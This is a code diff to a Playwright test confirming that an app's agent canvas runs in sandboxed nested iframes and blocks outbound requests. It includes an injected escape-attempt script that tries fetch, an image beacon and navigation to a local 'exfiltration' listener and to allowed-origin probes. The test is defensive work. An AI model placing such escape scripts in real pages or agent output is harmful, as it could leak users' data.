@@ -24,12 +24,15 @@ const STEP_TWO = `<form data-mindroom-label="Seats chosen">
   <label>Seats <input name="seats" value="3"></label>
   <button>Continue</button>
 </form>`;
-const escapeAttempt = (exfiltrationOrigin: string) => `<p id="state">Trying to leave</p>
+const escapeAttempt = (
+  exfiltrationOrigin: string,
+  navigateTo: string
+) => `<p id="state">Trying to leave</p>
 <script>
   fetch('${exfiltrationOrigin}/fetch').catch(() => undefined);
   const image = new Image();
   image.src = '${exfiltrationOrigin}/image';
-  setTimeout(() => { location.href = '${exfiltrationOrigin}/navigate'; }, 200);
+  setTimeout(() => { location.href = '${navigateTo}'; }, 200);
 </script>`;
 
 test('agent canvases run sandboxed, send only confirmed answers, and update in place', async ({
@@ -106,6 +109,16 @@ test('agent canvases run sandboxed, send only confirmed answers, and update in p
   });
   const exfiltrationOrigin = `http://127.0.0.1:${(listener.address() as AddressInfo).port}`;
   test.info().attach('exfiltration-origin', { body: exfiltrationOrigin });
+  // Chat's own origin and reCAPTCHA are allowed frame destinations for Chat, never for a canvas.
+  const allowedOriginProbes: string[] = [];
+  await context.route('**/canvas-escape-probe**', async (route) => {
+    allowedOriginProbes.push(route.request().url());
+    await route.fulfill({ body: 'escaped' });
+  });
+  await context.route('https://www.google.com/recaptcha/**', async (route) => {
+    allowedOriginProbes.push(route.request().url());
+    await route.fulfill({ body: 'escaped' });
+  });
   const pageErrors: string[] = [];
   page.on('pageerror', (error) => pageErrors.push(error.message));
   await context.route('**/config.json', async (route) => {
@@ -184,12 +197,15 @@ test('agent canvases run sandboxed, send only confirmed answers, and update in p
   );
 
   const panel = page.getByRole('complementary', { name: 'Canvas panel' });
-  const frame = page.frameLocator('aside[aria-label="Canvas panel"] iframe');
+  // The panel's frame holds a wrapper; the agent's page runs in the frame inside it.
+  const wrapper = page.frameLocator('aside[aria-label="Canvas panel"] iframe');
+  const frame = wrapper.frameLocator('iframe');
   const send = panel.getByRole('button', { name: 'Send', exact: true });
   const canvasId = await showCanvas(STEP_ONE);
   await expect(panel).toBeVisible();
   await expect(panel.getByText('Interactive panel from')).toBeVisible();
   await expect(panel.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
+  await expect(wrapper.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
 
   await frame.getByRole('button', { name: 'Pro' }).click();
   await expect(panel.getByText('Send to')).toContainText('Pro plan');
@@ -252,7 +268,12 @@ test('agent canvases run sandboxed, send only confirmed answers, and update in p
 
   // Work the user has not sent is never replaced without asking.
   await frame.getByRole('textbox').fill('5');
-  await updateCanvas(canvasId, escapeAttempt(exfiltrationOrigin), 'Escape attempt');
+  const chatOrigin = new URL(page.url()).origin;
+  await updateCanvas(
+    canvasId,
+    escapeAttempt(exfiltrationOrigin, `${chatOrigin}/canvas-escape-probe?same-origin`),
+    'Escape attempt'
+  );
   await expect(panel.getByText(/updated this panel/)).toBeVisible();
   await expect(frame.getByRole('textbox')).toHaveValue('5');
   await panel.getByRole('button', { name: 'Load update' }).click();
@@ -260,7 +281,17 @@ test('agent canvases run sandboxed, send only confirmed answers, and update in p
   // Whether a browser reports the blocked navigation or not, no request may leave.
   await page.waitForTimeout(1_500);
   expect(escapes).toEqual([]);
+  expect(allowedOriginProbes).toEqual([]);
   await page.screenshot({ path: testInfo.outputPath('canvas-contained.png') });
+  await updateCanvas(
+    canvasId,
+    escapeAttempt(exfiltrationOrigin, 'https://www.google.com/recaptcha/canvas-escape-probe'),
+    'Escape attempt'
+  );
+  await expect(frame.locator('#state')).toHaveText('Trying to leave');
+  await page.waitForTimeout(1_500);
+  expect(escapes).toEqual([]);
+  expect(allowedOriginProbes).toEqual([]);
 
   await panel.getByRole('button', { name: 'Close canvas' }).click();
   await expect(panel).toHaveCount(0);
@@ -303,7 +334,7 @@ article{background:var(--mr-surface);border:1px solid var(--mr-border);border-ra
   });
   await expect(panel.getByText('Report', { exact: true })).toBeVisible();
   await expect(frame.locator('#report')).toHaveText('Quarterly report');
-  const srcdoc = (await panel.locator('iframe').getAttribute('srcdoc')) ?? '';
+  const srcdoc = (await wrapper.locator('iframe').getAttribute('srcdoc')) ?? '';
   expect(srcdoc).toContain('--mr-surface:');
   expect(srcdoc).toContain('background:var(--mr-bg)');
   const conversation = page.getByText(fixture.replyBody, { exact: true });
